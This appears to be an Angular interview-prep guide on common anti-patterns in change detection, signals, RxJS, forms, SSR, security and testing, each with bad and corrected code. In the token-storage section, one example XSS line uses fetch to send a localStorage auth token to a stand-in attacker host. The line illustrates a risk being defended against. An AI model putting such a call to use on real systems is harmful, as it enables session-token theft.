# Common Angular Mistakes, Anti-Patterns, and Senior Corrections

> **Phase:** 9 — Revision & Preparation  
> **Related:** [quick-reference.md](./quick-reference.md) | [final-interview-checklist.md](./final-interview-checklist.md) | [code-review-checklist.md](../05-testing-and-quality/code-review-checklist.md)

---

## Table of Contents

1. [Overview](#overview)
2. [Change Detection & Performance Mistakes](#change-detection--performance-mistakes)
3. [Signals & RxJS Reactivity Mistakes](#signals--rxjs-reactivity-mistakes)
4. [Forms & Input Validation Mistakes](#forms--input-validation-mistakes)
5. [Dependency Injection & Architecture Mistakes](#dependency-injection--architecture-mistakes)
6. [Security & Authentication Mistakes](#security--authentication-mistakes)
7. [Unit Testing & Mocking Mistakes](#unit-testing--mocking-mistakes)
8. [AI-Assisted Development Mistakes](#ai-assisted-development-mistakes)
9. [Quick Revision Summary](#quick-revision-summary)

---

## Overview

This reference document compiles the most pervasive technical mistakes and anti-patterns encountered in enterprise Angular codebases. In senior interviews, candidates are frequently asked to identify these anti-patterns in code snippets and provide hardened corrections.

---

## Change Detection & Performance Mistakes

### Mistake 1: Invoking Methods in Template Bindings
```html
<!-- ❌ BAD: Evaluates on EVERY single change detection cycle! -->
<span>{{ formatCurrency(product.price) }}</span>
<button [disabled]="isFormInvalid()">Submit</button>
```
- **Why it's bad:** Methods executed inside templates run dozens of times per second during mouse movements, scrolling, or async events, leading to high CPU usage and frame drops.
- **Senior Correction:** Use pure pipes or `computed()` signals:
```html
<!-- ✅ GOOD: Evaluated only when underlying signals or inputs mutate -->
<span>{{ product.price | currency }}</span>
<button [disabled]="isSubmitDisabled()">Submit</button>
```

---

### Mistake 2: Missing `track` in `@for` Loops (or Tracking by Index)
```html
<!-- ❌ BAD: Tracking by index destroys and recreates DOM nodes on reorder -->
@for (item of items(); track $index) {
  <app-item-card [item]="item" />
}
```
- **Why it's bad:** Tracking by `$index` forces Angular to destroy and re-instantiate component DOM nodes whenever items are sorted, inserted at the beginning, or deleted.
- **Senior Correction:** Always track by a unique primitive identifier:
```html
<!-- ✅ GOOD: Preserves component DOM nodes across list transformations -->
@for (item of items(); track item.id) {
  <app-item-card [item]="item" />
}
```

---

## Signals & RxJS Reactivity Mistakes

### Mistake 3: Mutating Arrays/Objects In-Place Inside Signals
```typescript
// ❌ BAD: In-place mutation does not change the reference!
const current = this.items();
current.push(newItem);
this.items.set(current); // Angular uses Object.is() equality check and skips change detection!
```
- **Why it's bad:** Signals rely on referential equality checking (`Object.is`). Mutating an existing object or array in place skips downstream notification of `computed()` signals and template updates.
- **Senior Correction:** Always return a new immutable copy using `update()`:
```typescript
// ✅ GOOD: Emits fresh reference, triggering all downstream dependencies
this.items.update(list => [...list, newItem]);
```

---

### Mistake 4: Unmanaged RxJS Subscriptions in Components
```typescript
// ❌ BAD: Memory leak! Observable subscription lingers after component unmounts
ngOnInit() {
  this.notificationService.stream$.subscribe(msg => this.message = msg);
}
```
- **Why it's bad:** Root services retain the component instance in memory indefinitely, leaking DOM nodes and handlers.
- **Senior Correction:** Use `takeUntilDestroyed()`, `toSignal()`, or the `async` pipe:
```typescript
// ✅ GOOD: Modern auto-cleanup via injection context
readonly message = toSignal(this.notificationService.stream$, { initialValue: null });
```

---

### Mistake 5: Outer Pipe `catchError` in Typeahead Streams
```typescript
// ❌ BAD: Unhandled error completes the outer stream permanently!
this.searchControl.valueChanges.pipe(
  switchMap(q => this.http.get(`/api/search?q=${q}`)),
  catchError(() => of([])) // First HTTP failure kills the search box forever!
).subscribe();
```
- **Senior Correction:** Place `catchError` inside the inner observable:
```typescript
// ✅ GOOD: Catches HTTP failure locally; search input remains alive
this.searchControl.valueChanges.pipe(
  switchMap(q => this.http.get(`/api/search?q=${q}`).pipe(
    catchError(() => of([]))
  ))
).subscribe();
```

---

## Forms & Input Validation Mistakes

### Mistake 6: Mutating `FormGroup` Values Directly via Object Mutation
```typescript
// ❌ BAD: Bypasses form validation and dirty state tracking!
this.userForm.value.email = 'new@example.com';
```
- **Senior Correction:** Always use `patchValue()` or `setValue()`:
```typescript
// ✅ GOOD: Triggers valueChanges, statusChanges, and marks control appropriately
this.userForm.patchValue({ email: 'new@example.com' });
```

---

## Dependency Injection & Architecture Mistakes

### Mistake 7: Storing Per-User State in Singleton Services During SSR
```typescript
// ❌ BAD: Static user session in Node.js leaks data across concurrent users!
@Injectable({ providedIn: 'root' })
export class SessionService {
  private static userEmail: string;
}
```
- **Why it's bad:** A single Node process serves hundreds of concurrent users during Server-Side Rendering. Static fields will overwrite User A's data with User B's data!
- **Senior Correction:** Scope per-request data to the request injector or pass context via Express `res.locals`.

---

## Security & Authentication Mistakes

### Mistake 8: Storing Authentication Tokens in `localStorage`
```typescript
// ❌ BAD: Accessible to any XSS exploit!
localStorage.setItem('auth_token', jwt);
```
- **Why it's bad:** An attacker with a single XSS payload on any subdomain or package can execute `fetch('attacker.com', { body: localStorage.getItem('auth_token') })`.
- **Senior Correction:** Store access tokens **in-memory**; store refresh tokens in **`HttpOnly`, `Secure`, `SameSite=Strict` cookies** with the `__Host-` prefix.

---

### Mistake 9: Bypassing Sanitization with `bypassSecurityTrustHtml`
```typescript
// ❌ BAD: Immediate XSS vulnerability!
this.sanitizer.bypassSecurityTrustHtml(userSuppliedComment);
```
- **Senior Correction:** Render via standard Angular interpolation `{{ comment }}`, or sanitize through DOMPurify if rich text is required.

---

## Unit Testing & Mocking Mistakes

### Mistake 10: Omission of `httpTesting.verify()`
```typescript
// ❌ BAD: Leaves unhandled or duplicated HTTP requests undetected
afterEach(() => {
  // Missing httpTesting.verify();!
});
```
- **Senior Correction:** Always invoke `httpTesting.verify()` in `afterEach()` to guarantee no unexpected network calls were triggered.

---

## AI-Assisted Development Mistakes

### Mistake 11: Installing Hallucinated npm Packages Without Verification
- **Why it's bad:** Threat actors register hallucinated package names ("slopsquatting") containing malicious malware payloads.
- **Senior Correction:** Always verify package publication date, author, GitHub repository, and download metrics before executing `npm install`.

---

## Quick Revision Summary

| Topic Area | Anti-Pattern | Correct Senior Pattern |
|---|---|---|
| **Templates** | Method calls in bindings `{{ getTitle() }}` | Pure pipes or `computed()` signals |
| **Loops** | `track $index` on dynamic `@for` lists | Track unique primitive key (`track item.id`) |
| **Reactivity** | In-place array mutation `signal().push()` | Immutable updates `signal.update(l => [...l, item])` |
| **Streams** | Outer `catchError` killing search stream | Inner observable `catchError` inside `switchMap` |
| **State** | JWT in `localStorage` | In-memory access token + HttpOnly cookie |
| **Security** | `bypassSecurityTrustHtml` for raw HTML | Angular template interpolation or DOMPurify |
| **Testing** | Brittle CSS selectors in tests | Angular CDK Component Harnesses |
| **SSR** | Static class fields storing request state | Request-scoped injectors or `TransferState` |
